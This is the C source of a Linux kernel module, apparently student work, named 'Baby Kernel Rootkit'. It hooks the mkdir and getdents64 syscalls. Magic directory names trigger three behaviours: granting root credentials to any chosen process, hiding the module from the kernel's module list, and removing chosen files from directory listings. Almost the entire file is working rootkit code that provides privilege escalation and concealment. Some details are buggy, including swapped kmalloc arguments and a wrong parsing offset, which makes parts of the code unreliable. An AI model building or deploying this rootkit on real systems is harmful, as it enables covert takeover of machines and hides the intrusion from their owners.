#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/dirent.h>

MODULE_LICENSE("Dual MIT/GPL");
MODULE_AUTHOR("Group 10");
MODULE_DESCRIPTION("Baby Kernel Rootkit");
MODULE_VERSION("1.0.0");

#include "hook.h"
#define INLIST 1
#define NOTINLIST 0

void set_root(unsigned task_pid)
{
    struct pid *proc_pid = find_vpid(task_pid);
    struct task_struct *task;
    struct cred *root;

    if(!proc_pid) 
    {
        printk("rootkit: Failed to get pid.\n");
        return;
    }
    
    task = pid_task(proc_pid, PIDTYPE_PID);

    if (task == NULL) 
    {
      printk("rootkit: Failed to get this task info.\n");
      return;
    }

    root = prepare_creds();

    if (root == NULL)
    {
        printk(KERN_ALERT "rootkit: Failed to get creds.\n");
        return;
    }

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;
    
    rcu_assign_pointer(task->cred, root);

    printk(KERN_ALERT "rootkit: Process #%d is root now.\n", task_pid);
}

struct hide_file_list {
    struct list_head list;
    unsigned long file_ino;
};

struct hide_file_list *hide_files_head;

void init_links(void)
{
    hide_files_head = kmalloc(GFP_KERNEL, sizeof(struct hide_file_list));
    hide_files_head->file_ino = 0;
    INIT_LIST_HEAD(&hide_files_head->list);
}

void add_hide_file(const char * filename)
{
    struct file* target = NULL;
    target = filp_open(filename, O_PATH, 0);
    if(!IS_ERR(target)){
        struct hide_file_list *temp_file = kmalloc(sizeof(struct hide_file_list), GFP_KERNEL);
        temp_file->file_ino = target->f_inode->i_ino;
        INIT_LIST_HEAD(&temp_file->list);
        list_add_tail(&temp_file->list, &hide_files_head->list);

        printk(KERN_INFO "rootkit: Hide file added: %s %d.\n", filename, target->f_inode->i_ino);
    } else {
        printk(KERN_INFO "rootkit: No such file: %s.\n", filename);
    }
}

void del_hide_file(const char * filename)
{
    struct file* target = NULL;
    struct hide_file_list *cursor, *temp;
    target = filp_open(filename, O_PATH, 0);
    if(!IS_ERR(target)){
        list_for_each_entry_safe(cursor, temp, &hide_files_head->list, list) {
            if(target->f_inode->i_ino == cursor->file_ino)
            {
                list_del(&cursor->list);
                kfree(cursor);
            }
        }

        printk(KERN_INFO "rootkit: Hide file deleted: %s %d.\n", filename, target->f_inode->i_ino);
    } else {
        printk(KERN_INFO "rootkit: No such file: %s.\n", filename);
    }
}

int check_hide_file(unsigned long file_ino)
{
    struct hide_file_list *temp;
    list_for_each_entry(temp, &hide_files_head->list, list) {
        if(file_ino == temp->file_ino)
        {
            return INLIST;
        }
    }

    return NOTINLIST;
}

static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

static struct list_head *prev_module;
typedef unsigned char *byte_pointer;

void debug_show_bytes(byte_pointer start, int len) {
    printk(KERN_DEBUG "rootkit: Debug start: ");

    for (int i = 0; i < len; i++)
    {
        printk(KERN_CONT " %c", start[i]);
    }
    
    printk(KERN_CONT "\n");
}

int hide_status = 0;

void hide_module(void)
{
    if(!hide_status)
    {
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        hide_status = 1;
        printk(KERN_INFO "rootkit: Hide self success.\n");
    }
}

void show_module(void)
{
    if(hide_status)
    {
        list_add(&THIS_MODULE->list, prev_module);
        hide_status = 0;
        printk(KERN_INFO "rootkit: Show self success.\n");
    }
}

asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: Hook mkdir success.\n");
       
    
    if(strncmp(dir_name, "set-root@", 9) == 0)
    {
        set_root((unsigned)simple_strtol(&dir_name[5], (char **)(dir_name), 10));
    } 
    else if(strncmp(dir_name, "hide-module@", 12) == 0) 
    {
        hide_module();
    } 
    else if(strncmp(dir_name, "show-module@", 12) == 0) 
    {
        show_module();
    } 
    else if(strncmp(dir_name, "hide-file@", 10) == 0) 
    {
        add_hide_file(&dir_name[10]);
    }
    else if(strncmp(dir_name, "show-file@", 10) == 0) 
    {
        del_hide_file(&dir_name[10]);
    } 
    else 
    {
        orig_mkdir(regs);
    }

    return 0;
}

asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    long error;
    error = copy_from_user(dirent_ker, dirent, ret);
    if(error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if (check_hide_file(current_dir->d_ino))
        {
            if(current_dir == dirent_ker)
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if(error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
};


static int __init rootkit_init(void)
{
    int err;
    init_links();

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: Loaded. <============================>\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);